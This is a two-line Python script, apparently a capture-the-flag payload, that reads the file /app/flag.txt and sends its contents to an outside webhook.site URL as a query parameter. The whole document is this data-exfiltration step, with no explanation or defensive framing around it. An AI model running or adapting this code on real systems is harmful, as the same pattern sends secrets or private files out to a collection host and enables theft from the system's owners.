import requests

requests.get("https://webhook.site/6cc46cc8-91a2-4af0-ad21-4d172e924df3", params={'flag': open('/app/flag.txt').read()})
